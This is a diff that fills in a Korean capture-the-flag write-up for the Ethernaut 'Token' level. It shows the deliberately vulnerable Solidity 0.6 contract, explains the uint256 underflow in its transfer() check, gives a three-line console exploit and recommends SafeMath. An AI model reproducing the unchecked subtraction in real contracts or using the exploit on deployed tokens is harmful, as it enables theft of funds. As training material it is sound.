@@ -477,7 +477,7 @@ await contract.owner()
 
 ### 문제 요약
 
-작성 예정.
+초기 토큰 20개를 가진 상태에서 내 잔액을 더 크게 만들면 클리어된다. `transfer()`의 뺄셈 검증이 잘못되어 언더플로우가 발생한다.
 
 ### 핵심
 
@@ -485,19 +485,76 @@ await contract.owner()
 - Solidity 0.8 이전 산술
 - 잔액 검증
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+    mapping(address => uint256) balances;
+    uint256 public totalSupply;
+
+    constructor(uint256 _initialSupply) public {
+        balances[msg.sender] = totalSupply = _initialSupply;
+    }
+
+    function transfer(address _to, uint256 _value) public returns (bool) {
+        require(balances[msg.sender] - _value >= 0);
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+        return true;
+    }
+
+    function balanceOf(address _owner) public view returns (uint256 balance) {
+        return balances[_owner];
+    }
+}
+```
+
 ### 풀이
 
-작성 예정.
+취약점은 `transfer()`의 검증식이다.
+
+```solidity
+require(balances[msg.sender] - _value >= 0);
+```
+
+`balances[msg.sender]`와 `_value`는 `uint256`이다. 음수가 될 수 없다.
+
+Solidity 0.8 이전 버전에서는 산술 오버플로우와 언더플로우를 자동으로 막지 않는다. 내 잔액이 20인데 21을 전송하면 다음 계산이 먼저 일어난다.
+
+```text
+20 - 21
+```
+
+`uint256`에서는 음수 `-1`이 아니라 최댓값으로 감긴다.
+
+```text
+2^256 - 1
+```
+
+그래서 `require(... >= 0)`는 항상 통과한다. 이후 실제 차감에서도 언더플로우가 발생해 내 잔액이 매우 큰 값이 된다.
 
 ### 공격 코드
 
 ```javascript
-// 작성 예정
+await contract.balanceOf(player)
+
+await contract.transfer("0x0000000000000000000000000000000000000001", 21)
+
+await contract.balanceOf(player)
 ```
+
+- `balanceOf(player)`: 현재 잔액 20을 확인한다.
+- `transfer(..., 21)`: 가진 수량보다 1개 더 많이 전송해 언더플로우를 만든다.
+- 다시 `balanceOf(player)`: 잔액이 `uint256` 최댓값 근처로 바뀐 것을 확인한다.
 
 ### 정리
 
-작성 예정.
+Solidity 0.8 이전 코드에서는 산술 연산이 자동으로 안전하지 않다. 
+
+`uint256` 뺄셈 전에 `balances[msg.sender] >= _value`처럼 명확히 검증하거나 `SafeMath`를 사용해야 한다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Delegation" markdown="1">
